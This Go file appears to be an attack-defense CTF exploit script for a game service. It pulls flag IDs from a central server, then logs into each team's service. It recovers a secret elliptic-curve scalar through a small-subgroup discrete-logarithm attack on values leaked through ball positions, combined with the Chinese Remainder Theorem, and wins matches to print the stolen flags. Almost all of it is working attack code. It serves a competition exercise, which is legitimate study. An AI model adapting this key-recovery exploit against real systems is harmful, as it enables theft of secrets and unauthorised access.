package main

import (
	"apt"
	"apt/cmd/checker/utils"
	"apt/pkg/crypto"
	"apt/pkg/proto"
	"apt/pkg/ws"
	"bufio"
	"encoding/json"
	"fmt"
	"maps"
	"math"
	"math/big"
	"net/http"
	"os"
	"slices"
	"strconv"
	"strings"

	"github.com/chobie/go-gaussian"
	"github.com/jakecoffman/cp"
)

func getFlagIds(teamId string) []uint64 {
	resp, err := http.Get("http://10.10.0.1:8081/flagIds")
	if err != nil {
		panic(err)
	}

	defer func() { _ = resp.Body.Close() }()

	type data struct {
		APTFinals map[string]map[string]uint64 `json:"APT-Finals-1"`
	}

	var flagIds data
	if err := json.NewDecoder(resp.Body).Decode(&flagIds); err != nil {
		panic(err)
	}

	return slices.Collect(maps.Values(flagIds.APTFinals[teamId]))
}

func smallDlog(curve *crypto.Curve, fact int, prob float64, dic map[float32]int) int {
	dist := gaussian.NewGaussian(0, 10.0)
	quo := math.Pow(2*dist.Cdf(-25*prob), -1) - 1
	if fact == 1048576 {
		return dic[float32(quo)]
	}
	cofact := new(big.Int).Div(curve.N, big.NewInt(int64(fact)))
	G1 := curve.ScalarMult(curve.G, cofact)
	G2 := curve.ScalarMult(curve.G, cofact)
	for i := range fact {
		G2x := new(big.Float).SetInt(G2.X)
		G2y := new(big.Float).SetInt(G2.Y)
		G2y.Quo(G2y, G2x)
		G2yf, _ := G2y.Float64()
		if math.Abs(G2yf-quo) < 1e-9 {
			fmt.Printf("G2yf = %.10f\n", G2yf)
			fmt.Printf("quo = %.10f\n", quo)
			return i + 1
		}
		G2 = curve.Add(G2, G1)
	}
	return -1
}

func loadDlog220() map[float32]int {
	dic := make(map[float32]int)
	file, err := os.Open("./cmd/exploitSmallSubgroups/dlog_220")
	if err != nil {
		panic(err)
	}
	defer file.Close()
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		line := scanner.Text()
		sl := strings.Split(line, " ")
		if !strings.Contains(sl[0], "e+") {
			k, err := strconv.ParseFloat(sl[0], 32)
			if err != nil {
				panic(err)
			}
			v, err := strconv.ParseInt(sl[1], 10, 32)
			if err != nil {
				panic(err)
			}
			dic[float32(k)] = int(v)
		}
	}

	if err := scanner.Err(); err != nil {
		panic(err)
	}
	return dic
}

func MyLoadDLog(fac int) map[string]int {
	res := make(map[string]int)
	file, err := os.Open(fmt.Sprintf("cmd/exploitSmallSubgroups/dlogs/dlog_%d", fac))
	if err != nil {
		panic(err)
	}
	defer file.Close()
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		line := scanner.Text()
		sl := strings.Split(line, " ")
		Px, _ := new(big.Int).SetString(sl[0], 10)
		Py, _ := new(big.Int).SetString(sl[1], 10)
		dlog, _ := strconv.ParseInt(sl[2], 10, 32)
		res[fmt.Sprintf("%d_%d", Px, Py)] = int(dlog)
	}

	if err := scanner.Err(); err != nil {
		panic(err)
	}
	return res
}

func GetVals(client *ws.Client, curve *crypto.Curve, vals, factors []int, dic map[float32]int) (*proto.ResponseDataPoint, []int) {
	resp, err := utils.PlayFirstBall(client)
	if err != nil {
		panic(err)
	}
	isClient := true
	dstBall := cp.Vector{X: resp.X1, Y: resp.Y1}
	posClient := cp.Vector{X: apt.BallStartX, Y: apt.BallStartY}
	posBot := cp.Vector{X: apt.BotStartX, Y: apt.BotStartY}
	for {
		isClient = !isClient
		if (isClient && dstBall.Distance(posClient)/apt.PlayerSpeed > (apt.BallFirstBounceDuration+1e-7)) || (!isClient && dstBall.Distance(posBot)/apt.PlayerSpeed > (apt.BallFirstBounceDuration+1e-7)) {
			respPoint, err := utils.ScorePoint(client)
			if err != nil {
				panic(err)
			}

			_, _ = fmt.Fprintf(os.Stderr, "End = %t, Prize = %s, ClientPoints = %d, BotPoints = %d\n", respPoint.End, respPoint.Prize, respPoint.ClientPoints, respPoint.BotPoints)
			return respPoint, vals
		} else {
			if len(vals) < len(factors) {
				r1 := new(big.Int).Div(curve.N, big.NewInt(int64(factors[len(vals)])))
				r2 := new(big.Int).Div(curve.N, big.NewInt(int64(factors[len(vals)])))
				posClient, posBot, dstBall, err = utils.PlayBall(client, posClient, posBot, dstBall, r1, r2, isClient, false)
				var px, py float64
				if isClient {
					px = (dstBall.X/apt.CourtWidth - 0.75) / 0.25
					py = (dstBall.Y/apt.CourtHeight - 0.5) / 0.375
					fmt.Printf("px = %.10f\n", px)
					fmt.Printf("py = %.10f\n", py)
					f := smallDlog(curve, factors[len(vals)], math.Abs(px), dic)
					fmt.Printf("f = %d\n", f)
					fmt.Printf("fact = %d\n", factors[len(vals)])
					vals = append(vals, f)
				}
			} else {
				posClient, posBot, dstBall, err = utils.PlayBall(client, posClient, posBot, dstBall, big.NewInt(0), big.NewInt(0), isClient, true)
			}
			if err != nil {
				panic(err)
			}
		}
	}
}

func CRT(vals, invs []int, cofacts []*big.Int) *big.Int {
	res := big.NewInt(0)

	for i := range len(vals) {
		tmp := big.NewInt(int64(vals[i]))
		tmp.Mul(tmp, cofacts[i])
		tmp.Mul(tmp, big.NewInt(int64(invs[i])))
		res.Add(res, tmp)
	}

	return res
}

func WinMatch(client *ws.Client) string {
	P, _ := new(big.Int).SetString("32993028718791676799062280315466580754431", 10)
	N, _ := new(big.Int).SetString("32993028718791676799062280315466580754432", 10)
	Gx, _ := new(big.Int).SetString("9303000621785476190709230799534131554011", 10)
	Gy, _ := new(big.Int).SetString("31009977496009883450976840324529127486069", 10)
	factors := []int{1048576, 761, 1213, 1471, 2447, 3067, 3947, 4373, 4663, 5189, 7393}
	invs := []int{387019, 524, 1063, 1225, 418, 1624, 3431, 2098, 4091, 3099, 5244}
	curve := crypto.NewCurve(P, N, Gx, Gy, factors, invs)

	var cofacts []*big.Int
	for _, f := range factors {
		fmt.Printf("f = %d\n", f)
		cof := new(big.Int).Div(curve.N, big.NewInt(int64(f)))
		cofacts = append(cofacts, cof)
	}

	vals := []int{}
	var secret *big.Int
	var dlogs []map[string]int

	dic := loadDlog220()
	var respPoint *proto.ResponseDataPoint
	for {
		if len(vals) < len(factors) {
			respPoint, vals = GetVals(client, curve, vals, factors, dic)
			if len(vals) == len(factors) {
				secret = CRT(vals, invs, cofacts)
				fmt.Printf("s = %d\n", secret)
				for _, fact := range curve.Factors {
					dlogs = append(dlogs, MyLoadDLog(fact)) //to fix
				}
			}
		} else {
			respPoint, _ = utils.PlayGoodPoint(client, curve, secret, dlogs, 1.0)
		}
		if respPoint.End {
			return respPoint.Prize
		}
	}
}

func exploit(teamId string, matchId uint64) string {
	client, err := ws.NewClient(fmt.Sprintf("10.60.%s.1:8080", teamId), nil)
	if err != nil {
		panic(err)
	}

	username, secret := utils.RandStr(16), utils.RandStr(16)
	password, err := client.Register(username, secret)
	if err != nil {
		panic(err)
	}

	ok, err := client.Login(username, password)
	if err != nil {
		panic(err)
	} else if !ok {
		panic("login failed")
	}

	if err := utils.PlayMatch(client, matchId); err != nil {
		panic(err)
	}

	for range 20 {
		flag := WinMatch(client)
		if flag != "" {
			return flag
		}
		if err := utils.PlayMatch(client, matchId); err != nil {
			panic(err)
		}
	}

	panic("not found")
}

func main() {
	flagIds := getFlagIds(os.Args[1])
	for _, flagId := range flagIds {
		flag := exploit(os.Args[1], flagId)
		println(flag)
	}
}
